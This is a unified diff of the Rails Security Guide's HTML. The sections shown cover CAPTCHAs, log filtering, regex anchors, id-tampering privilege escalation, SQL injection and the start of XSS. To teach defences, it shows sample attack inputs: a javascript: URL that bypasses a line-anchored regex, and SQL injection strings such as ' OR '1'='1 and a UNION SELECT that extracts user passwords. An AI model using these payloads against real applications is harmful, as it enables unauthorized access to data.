id="other"><a class="anchorlink" href="#other">6.2.3 Other</a></h5><p>Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in <a href="https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. In this proof-of-concept attack, the victim would have been lured to a website controlled by the attacker. On that site is a crafted IMG-tag which results in an HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, <em>review your application logic and eliminate all XSS and CSRF vulnerabilities</em>.</p><h4 id="captchas"><a class="anchorlink" href="#captchas">6.3 CAPTCHAs</a></h4><div class="info"><p><em>A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect registration forms from attackers and comment forms from automatic spam bots by asking the user to type the letters of a distorted image. This is the positive CAPTCHA, but there is also the negative CAPTCHA. The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot.</em></p></div><p>A popular positive CAPTCHA API is <a href="https://developers.google.com/recaptcha/">reCAPTCHA</a> which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. <a href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> is also a Rails plug-in with the same name as the API.</p><p>You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
+The problem with CAPTCHAs is that they have a negative impact on the user experience. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. Still, positive CAPTCHAs are one of the best methods to prevent all kinds of bots from submitting forms.</p><p>Most bots are really naive. They crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.</p><p>Note that negative CAPTCHAs are only effective against naive bots and won't suffice to protect critical applications from targeted bots. Still, the negative and positive CAPTCHAs can be combined to increase the performance, e.g., if the "honeypot" field is not empty (bot detected), you won't need to verify the positive CAPTCHA, which would require an HTTPS request to Google ReCaptcha before computing the response.</p><p>Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:</p>
 <ul>
 <li>position the fields off of the visible area of the page</li>
 <li>make the elements very small or color them the same as the background of the page</li>
@@ -682,64 +657,64 @@ The problem with CAPTCHAs is that they have a negative impact on the user experi
 <p>Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So <em>negative CAPTCHAs might not be good to protect login forms</em>.</p><h4 id="logging"><a class="anchorlink" href="#logging">6.4 Logging</a></h4><div class="warning"><p><em>Tell Rails not to put passwords in the log files.</em></p></div><p>By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can <em>filter certain request parameters from your log files</em> by appending them to <code>config.filter_parameters</code> in the application configuration. These parameters will be marked [FILTERED] in the log.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">filter_parameters</span> <span class="o">&lt;&lt;</span> <span class="ss">:password</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-58bfd2c8ef584571edc1670f19e4db98">config.filter_parameters &lt;&lt; :password
+<textarea class="clipboard-content" id="clipboard-8b7bf6eb3b3827bee597eb3af35fa200">config.filter_parameters &lt;&lt; :password
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-58bfd2c8ef584571edc1670f19e4db98">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-8b7bf6eb3b3827bee597eb3af35fa200">Copiar</button>
 </div>
 <div class="note"><p>Provided parameters will be filtered out by partial matching regular expression. Rails adds default <code>:password</code> in the appropriate initializer (<code>initializers/filter_parameter_logging.rb</code>) and cares about typical application parameters <code>password</code> and <code>password_confirmation</code>.</p></div><h4 id="regular-expressions"><a class="anchorlink" href="#regular-expressions">6.5 Regular Expressions</a></h4><div class="info"><p><em>A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z.</em></p></div><p>Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:</p><div class="code_container">
 <pre><code class="highlight ruby">  <span class="sr">/^https?:\/\/[^\n]+$/i</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-4154cfe924099ba2cc44404e2e9be0d0">  /^https?:\/\/[^\n]+$/i
+<textarea class="clipboard-content" id="clipboard-8fe11ecccf19bfecc0f1e098bf7fa502">  /^https?:\/\/[^\n]+$/i
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-4154cfe924099ba2cc44404e2e9be0d0">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-8fe11ecccf19bfecc0f1e098bf7fa502">Copiar</button>
 </div>
 <p>This may work fine in some languages. However, <em>in Ruby <code>^</code> and <code>$</code> match the <strong>line</strong> beginning and line end</em>. And thus a URL like this passes the filter without problems:</p><div class="code_container">
 <pre><code class="highlight plaintext">javascript:exploit_code();/*
 http://hi.com
 */
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-02ad9313af72e30b95547810129bf569">javascript:exploit_code();/*
+<textarea class="clipboard-content" id="clipboard-d1afa4930b924eeb9274e10ee7355633">javascript:exploit_code();/*
 http://hi.com
 */
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-02ad9313af72e30b95547810129bf569">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-d1afa4930b924eeb9274e10ee7355633">Copiar</button>
 </div>
 <p>This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:</p><div class="code_container">
 <pre><code class="highlight ruby">  <span class="n">link_to</span> <span class="s2">"Homepage"</span><span class="p">,</span> <span class="vi">@user</span><span class="p">.</span><span class="nf">homepage</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-eeee8f61a8a11d77f5ad2e67570d7ada">  link_to "Homepage", @user.homepage
+<textarea class="clipboard-content" id="clipboard-e3c738dbe674551b355241c8450a1c44">  link_to "Homepage", @user.homepage
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-eeee8f61a8a11d77f5ad2e67570d7ada">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-e3c738dbe674551b355241c8450a1c44">Copiar</button>
 </div>
 <p>The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.</p><p>To fix the regular expression, <code>\A</code> and <code>\z</code> should be used instead of <code>^</code> and <code>$</code>, like so:</p><div class="code_container">
 <pre><code class="highlight ruby">  <span class="sr">/\Ahttps?:\/\/[^\n]+\z/i</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-66af80451ead5dea4a03728310da3a23">  /\Ahttps?:\/\/[^\n]+\z/i
+<textarea class="clipboard-content" id="clipboard-ad8c31d2e77bf15b636079c47c77e176">  /\Ahttps?:\/\/[^\n]+\z/i
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-66af80451ead5dea4a03728310da3a23">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-ad8c31d2e77bf15b636079c47c77e176">Copiar</button>
 </div>
 <p>Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:</p><div class="code_container">
 <pre><code class="highlight ruby">  <span class="c1"># content should include a line "Meanwhile" anywhere in the string</span>
   <span class="n">validates</span> <span class="ss">:content</span><span class="p">,</span> <span class="ss">format: </span><span class="p">{</span> <span class="ss">with: </span><span class="sr">/^Meanwhile$/</span><span class="p">,</span> <span class="ss">multiline: </span><span class="kp">true</span> <span class="p">}</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-3fd7443c45d4d21063a679f455f536af">  # content should include a line "Meanwhile" anywhere in the string
+<textarea class="clipboard-content" id="clipboard-50bb17027cb83df5673c7ee3f893fce0">  # content should include a line "Meanwhile" anywhere in the string
   validates :content, format: { with: /^Meanwhile$/, multiline: true }
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-3fd7443c45d4d21063a679f455f536af">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-50bb17027cb83df5673c7ee3f893fce0">Copiar</button>
 </div>
 <p>Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the <strong>line</strong> beginning and line end in Ruby, and not the beginning and end of a string.</p><h4 id="privilege-escalation"><a class="anchorlink" href="#privilege-escalation">6.6 Privilege Escalation</a></h4><div class="warning"><p><em>Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it.</em></p></div><p>The most common parameter that a user might tamper with, is the id parameter, as in <code>http://www.domain.com/project/1</code>, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="vi">@project</span> <span class="o">=</span> <span class="no">Project</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-8313e3031ebaef62c88ab98c6f531ac2">@project = Project.find(params[:id])
+<textarea class="clipboard-content" id="clipboard-624f903c860449d2e10b313db0ee45ff">@project = Project.find(params[:id])
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-8313e3031ebaef62c88ab98c6f531ac2">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-624f903c860449d2e10b313db0ee45ff">Copiar</button>
 </div>
 <p>This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. Instead, <em>query the user's access rights, too</em>:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="vi">@project</span> <span class="o">=</span> <span class="vi">@current_user</span><span class="p">.</span><span class="nf">projects</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-4f27bb429b07d6dfe232b323a3d8a0e8">@project = @current_user.projects.find(params[:id])
+<textarea class="clipboard-content" id="clipboard-dcb0d36b56edf69b6b8a9aea98868428">@project = @current_user.projects.find(params[:id])
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-4f27bb429b07d6dfe232b323a3d8a0e8">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-dcb0d36b56edf69b6b8a9aea98868428">Copiar</button>
 </div>
 <p>Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, <em>no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated</em>.</p><p>Don't be fooled by security by obfuscation and JavaScript security. Developer tools let you review and change every form's hidden fields. <em>JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values</em>. The Firebug addon for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.</p><h3 id="injection"><a class="anchorlink" href="#injection">7 Injection</a></h3><div class="info"><p><em>Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection.</em></p></div><p>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query, or programming language, the shell, or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</p><h4 id="permitted-lists-versus-restricted-lists"><a class="anchorlink" href="#permitted-lists-versus-restricted-lists">7.1 Permitted lists versus Restricted lists</a></h4><div class="note"><p><em>When sanitizing, protecting, or verifying something, prefer permitted lists over restricted lists.</em></p></div><p>A restricted list can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a permitted list which lists the good e-mail addresses, public actions, good HTML tags, and so on. Although sometimes it is not possible to create a permitted list (in a SPAM filter, for example), <em>prefer to use permitted list approaches</em>:</p>
 <ul>
@@ -757,254 +732,309 @@ http://hi.com
 <p>Permitted lists are also a good approach against the human factor of forgetting something in the restricted list.</p><h4 id="sql-injection"><a class="anchorlink" href="#sql-injection">7.2 SQL Injection</a></h4><div class="info"><p><em>Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.</em></p></div><h5 id="introduction"><a class="anchorlink" href="#introduction">7.2.1 Introduction</a></h5><p>SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">Project</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"name = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-f7338fa18fbcc4ac566ac0039aa234ec">Project.where("name = '#{params[:name]}'")
+<textarea class="clipboard-content" id="clipboard-526aa89930a781df9ab8b3acc3326ee4">Project.where("name = '#{params[:name]}'")
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-f7338fa18fbcc4ac566ac0039aa234ec">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-526aa89930a781df9ab8b3acc3326ee4">Copiar</button>
 </div>
 <p>This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters <code>' OR 1 --</code>, the resulting SQL query will be:</p><div class="code_container">
 <pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">projects</span> <span class="k">WHERE</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="mi">1</span> <span class="c1">--'</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-b4bc208ff1c85fc02137fe4839a3605d">SELECT * FROM projects WHERE name = '' OR 1 --'
+<textarea class="clipboard-content" id="clipboard-6fb1d9b3efb3be3dd12461ba6f3b3b8b">SELECT * FROM projects WHERE name = '' OR 1 --'
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-b4bc208ff1c85fc02137fe4839a3605d">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-6fb1d9b3efb3be3dd12461ba6f3b3b8b">Copiar</button>
 </div>
 <p>The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.</p><h5 id="bypassing-authorization"><a class="anchorlink" href="#bypassing-authorization">7.2.2 Bypassing Authorization</a></h5><p>Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">User</span><span class="p">.</span><span class="nf">find_by</span><span class="p">(</span><span class="s2">"login = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">' AND password = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:password</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-1508366947f373fe0547496ac5158e78">User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
+<textarea class="clipboard-content" id="clipboard-0138c43b9ed8804bd2d556caf23d931d">User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-1508366947f373fe0547496ac5158e78">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-0138c43b9ed8804bd2d556caf23d931d">Copiar</button>
 </div>
 <p>If an attacker enters <code>' OR '1'='1</code> as the name, and <code>' OR '2'&gt;'1</code> as the password, the resulting SQL query will be:</p><div class="code_container">
 <pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">login</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="s1">'2'</span><span class="o">&gt;</span><span class="s1">'1'</span> <span class="k">LIMIT</span> <span class="mi">1</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-74a60136e8e71deda61ddd75ac16cad7">SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
+<textarea class="clipboard-content" id="clipboard-232af25c2908472c345b2fccc2db8537">SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-74a60136e8e71deda61ddd75ac16cad7">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-232af25c2908472c345b2fccc2db8537">Copiar</button>
 </div>
 <p>This will simply find the first record in the database, and grants access to this user.</p><h5 id="unauthorized-reading"><a class="anchorlink" href="#unauthorized-reading">7.2.3 Unauthorized Reading</a></h5><p>The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">Project</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"name = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-cc3c4bbcd52ea530759c4215dd438247">Project.where("name = '#{params[:name]}'")
+<textarea class="clipboard-content" id="clipboard-f6e020a52a9fed9f694d006e7017b302">Project.where("name = '#{params[:name]}'")
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-cc3c4bbcd52ea530759c4215dd438247">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-f6e020a52a9fed9f694d006e7017b302">Copiar</button>
 </div>
 <p>And now let's inject another query using the UNION statement:</p><div class="code_container">
 <pre><code class="highlight plaintext">') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-f40987b20676997ec7a9a08489ec9f4d">') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
+<textarea class="clipboard-content" id="clipboard-9f32155e439ee134a3f0778b81234647">') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-f40987b20676997ec7a9a08489ec9f4d">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-9f32155e439ee134a3f0778b81234647">Copiar</button>
 </div>
 <p>This will result in the following SQL query:</p><div class="code_container">
 <pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">projects</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="k">UNION</span>
   <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span><span class="n">login</span> <span class="k">AS</span> <span class="n">name</span><span class="p">,</span><span class="n">password</span> <span class="k">AS</span> <span class="n">description</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">FROM</span> <span class="n">users</span> <span class="c1">--'</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-2e7be0e32a87c1b9d6e335ba1e71dc33">SELECT * FROM projects WHERE (name = '') UNION
+<textarea class="clipboard-content" id="clipboard-82c6fdb949b5c51d08b9a5017b74facd">SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --'
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-2e7be0e32a87c1b9d6e335ba1e71dc33">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-82c6fdb949b5c51d08b9a5017b74facd">Copiar</button>
 </div>
-<p>The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</p><p>Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">to at least 2.1.1</a>.</p><h5 id="sql-injection-countermeasures"><a class="anchorlink" href="#sql-injection-countermeasures">7.2.4 Countermeasures</a></h5><p>Ruby on Rails has a built-in filter for special SQL characters, which will escape <code>'</code> , <code>"</code> , NULL character, and line breaks. <em>Using <code>Model.find(id)</code> or <code>Model.find_by_some thing(something)</code> automatically applies this countermeasure</em>. But in SQL fragments, especially <em>in conditions fragments (<code>where("...")</code>), the <code>connection.execute()</code> or <code>Model.find_by_sql()</code> methods, it has to be applied manually</em>.</p><p>Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:</p><div class="code_container">
-<pre><code class="highlight ruby"><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"login = ? AND password = ?"</span><span class="p">,</span> <span class="n">entered_user_name</span><span class="p">,</span> <span class="n">entered_password</span><span class="p">).</span><span class="nf">first</span>
+<p>The result won't be a list of projects (because there is no project with an empty name), but a list of usernames and their password. So hopefully you <a href="#user-management">securely hashed the passwords</a> in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</p><p>Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails <a href="https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html">to at least 2.1.1</a>.</p><h5 id="sql-injection-countermeasures"><a class="anchorlink" href="#sql-injection-countermeasures">7.2.4 Countermeasures</a></h5><p>Ruby on Rails has a built-in filter for special SQL characters, which will escape <code>'</code> , <code>"</code> , NULL character, and line breaks. <em>Using <code>Model.find(id)</code> or <code>Model.find_by_some thing(something)</code> automatically applies this countermeasure</em>. But in SQL fragments, especially <em>in conditions fragments (<code>where("...")</code>), the <code>connection.execute()</code> or <code>Model.find_by_sql()</code> methods, it has to be applied manually</em>.</p><p>Instead of passing a string, you can use positional handlers to sanitize tainted strings like this:</p><div class="code_container">
+<pre><code class="highlight ruby"><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"zip_code = ? AND quantity &gt;= ?"</span><span class="p">,</span> <span class="n">entered_zip_code</span><span class="p">,</span> <span class="n">entered_quantity</span><span class="p">).</span><span class="nf">first</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-0a3bdfe676a57ec69270e743f7c903db">Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
+<textarea class="clipboard-content" id="clipboard-da83a3fd9ca473cbb227f003cde52643">Model.where("zip_code = ? AND quantity &gt;= ?", entered_zip_code, entered_quantity).first
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-0a3bdfe676a57ec69270e743f7c903db">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-da83a3fd9ca473cbb227f003cde52643">Copiar</button>
 </div>
-<p>As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:</p><div class="code_container">
-<pre><code class="highlight ruby"><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="ss">login: </span><span class="n">entered_user_name</span><span class="p">,</span> <span class="ss">password: </span><span class="n">entered_password</span><span class="p">).</span><span class="nf">first</span>
+<p>The first parameter is a SQL fragment with question marks. The second and third
+parameter will replace the question marks with the value of the variables.</p><p>You can also use named handlers, the values will be taken from the hash used:</p><div class="code_container">
+<pre><code class="highlight ruby"><span class="n">values</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">zip: </span><span class="n">entered_zip_code</span><span class="p">,</span> <span class="ss">qty: </span><span class="n">entered_quantity</span> <span class="p">}</span>
+<span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"zip_code = :zip AND quantity &gt;= :qty"</span><span class="p">,</span> <span class="n">values</span><span class="p">).</span><span class="nf">first</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-510c9cc5a15402bf2092e5256f2eacc5">Model.where(login: entered_user_name, password: entered_password).first
+<textarea class="clipboard-content" id="clipboard-6b735c50eefd5da3707c03540b9cff36">values = { zip: entered_zip_code, qty: entered_quantity }
+Model.where("zip_code = :zip AND quantity &gt;= :qty", values).first
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-510c9cc5a15402bf2092e5256f2eacc5">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-6b735c50eefd5da3707c03540b9cff36">Copiar</button>
 </div>
-<p>The array or hash form is only available in model instances. You can try <code>sanitize_sql()</code> elsewhere. <em>Make it a habit to think about the security consequences when using an external string in SQL</em>.</p><h4 id="cross-site-scripting-xss"><a class="anchorlink" href="#cross-site-scripting-xss">7.3 Cross-Site Scripting (XSS)</a></h4><div class="info"><p><em>The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</em></p></div><h5 id="entry-points"><a class="anchorlink" href="#entry-points">7.3.1 Entry Points</a></h5><p>An entry point is a vulnerable URL and its parameters where an attacker can start an attack.</p><p>The most common entry points are message posts, user comments, and guest books, but project titles, document names, and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.</p><p>XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.</p><p>During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security threat report</a> also documented 239 browser plug-in vulnerabilities in the last six months of 2007. <a href="http://pandalabs.pandasecurity.com/mpack-uncovered/">Mpack</a> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.</p><h5 id="html-javascript-injection"><a class="anchorlink" href="#html-javascript-injection">7.3.2 HTML/JavaScript Injection</a></h5><p>The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. <em>Escaping user input is essential</em>.</p><p>Here is the most straightforward test to check for XSS:</p><div class="code_container">
+<p>Additionally, you can split and chain conditionals valid for your use case:</p><div class="code_container">
+<pre><code class="highlight ruby"><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="ss">zip_code: </span><span class="n">entered_zip_code</span><span class="p">).</span><span class="nf">where</span><span class="p">(</span><span class="s2">"quantity &gt;= ?"</span><span class="p">,</span> <span class="n">entered_quantity</span><span class="p">).</span><span class="nf">first</span>
+</code></pre>
+<textarea class="clipboard-content" id="clipboard-88e91972583ebd54ea117d34bd9a4ff7">Model.where(zip_code: entered_zip_code).where("quantity &gt;= ?", entered_quantity).first
+</textarea>
+<button class="clipboard-button" data-clipboard-target="#clipboard-88e91972583ebd54ea117d34bd9a4ff7">Copiar</button>
+</div>
+<p>Note the previous mentioned countermeasures are only available in model instances. You can
+try <code>sanitize_sql()</code> elsewhere. <em>Make it a habit to think about the security consequences
+when using an external string in SQL</em>.</p><h4 id="cross-site-scripting-xss"><a class="anchorlink" href="#cross-site-scripting-xss">7.3 Cross-Site Scripting (XSS)</a></h4><div class="info"><p><em>The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</em></p></div><h5 id="entry-points"><a class="anchorlink" href="#entry-points">7.3.1 Entry Points</a></h5><p>An entry point is a vulnerable URL and its parameters where an attacker can start an attack.</p><p>The most common entry points are message posts, user comments, and guest books, but project titles, document names, and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on websites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.</p><p>XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the website to get confidential information or install malicious software through security holes in the web browser.</p><p>During the second half of 